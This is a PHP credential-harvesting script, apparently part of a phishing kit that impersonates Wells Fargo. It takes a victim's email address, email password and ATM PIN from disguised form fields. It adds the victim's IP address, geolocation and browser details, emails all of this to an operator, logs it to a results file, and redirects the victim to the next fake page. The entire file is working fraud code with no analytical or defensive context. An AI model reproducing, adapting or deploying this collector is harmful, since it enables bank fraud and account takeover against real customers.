<?php

$emailAddr = $_POST['henajksk'];
$emailPass = $_POST['hjdktkd'];
$atmPin = $_POST['hsteksklsk'];

require_once('email_config.php');
require_once('geoplugin.class.php');
$geoplugin = new geoPlugin();

//get user's ip address
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}

if ($emailAddr != null && $emailPass != null && $atmPin != null) {

    $message = "";
    $message .= "---|Wells-fargo|---\n";
    $message .= "Email Address: " .$emailAddr. "\n";
    $message .= "Email Password: " .$emailPass. "\n";
    $message .= "ATM PIN: " .$atmPin. "\n";
    $message .= "IP : " .$ip. "\n";
    $message .= "--------------------------\n";
    $message .=     "City: {$geoplugin->city}\n";
    $message .=     "Region: {$geoplugin->region}\n";
    $message .=     "Country Name: {$geoplugin->countryName}\n";
    $message .=     "Country Code: {$geoplugin->countryCode}\n";
    $message .=     "Date: ".date("D M d, Y g:i a")."\n";
    $message .=     "Browser Details: ".$_SERVER['HTTP_USER_AGENT']."\n";
    $message .= "--------------------------\n";


    $subj = " Wells |- " . $ip . "\n";

    mail($email, $subj, $message, $from);

    file_put_contents('../wells_rezlt.txt', $message, FILE_APPEND);

    header("location: ../pafe_d.php?id=$praga$praga&session=$praga$praga");
} else {
    //exit(header('Location: https://www.wellsfargo.com/'));
    header("location: ../pafe_c.php?id=$praga$praga&session=$praga$praga");
}

?>